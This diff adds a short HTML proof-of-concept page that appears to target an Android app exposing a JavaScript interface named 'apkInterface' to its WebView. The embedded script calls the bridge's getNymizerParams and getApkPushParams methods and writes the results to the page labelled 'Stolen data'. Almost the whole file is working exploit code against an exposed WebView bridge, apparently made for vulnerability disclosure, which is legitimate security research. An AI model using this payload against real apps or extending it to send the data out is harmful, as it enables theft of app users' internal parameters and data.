@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><title>POC</title></head>
+<body style="text-align: center;">
+   <script type="text/javascript">
+       var data;
+       if(window.apkInterface) { 
+            var getNymizerParams = "getNymizerParams: " + window.apkInterface.getNymizerParams() + "\n";
+            var apkPushParams = "apkPushParams: " + window.apkInterface.getApkPushParams();
+            data = apkPushParams + getNymizerParams;
+      }
+​
+       if(data) {
+           document.write("Stolen data: " + data);
+      }
+   </script>
+   <h1><a>POC!</a></h1>
+</body>
+</html>
